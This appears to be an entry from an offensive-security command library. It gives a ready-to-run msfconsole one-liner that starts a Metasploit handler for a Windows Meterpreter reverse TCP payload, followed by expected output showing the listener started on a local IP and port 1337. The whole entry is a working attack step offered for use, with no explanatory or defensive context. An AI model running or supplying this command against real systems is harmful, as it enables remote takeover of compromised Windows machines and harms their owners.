---
id: 14c32be1-92eb-42aa-9e71-67211555c718
name: msfconsole Meterpreter Windows Listener
type: command
executor: null
data: msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;
  set LHOST $LOCAL_IP; set LPORT $LOCAL_PORT; run;exit -y"
output: 'root@hackers:~# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;
  set LHOST 172.16.162.187; set LPORT 1337; run;exit -y"

  [-] ***

  [-] * WARNING: No database support: No database YAML file

  [-] ***

  PAYLOAD => windows/meterpreter/reverse_tcp

  LHOST => 172.16.162.187

  LPORT => 1337

  [*] Started reverse TCP handler on 172.16.162.187:1337'
created_at: '2019-09-17T17:46:36.380087+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# msfconsole Meterpreter Windows Listener

```bash
msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $LOCAL_IP; set LPORT $LOCAL_PORT; run;exit -y"
```

## Expected Output

```
root@hackers:~# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 172.16.162.187; set LPORT 1337; run;exit -y"
[-] ***
[-] * WARNING: No database support: No database YAML file
[-] ***
PAYLOAD => windows/meterpreter/reverse_tcp
LHOST => 172.16.162.187
LPORT => 1337
[*] Started reverse TCP handler on 172.16.162.187:1337
```


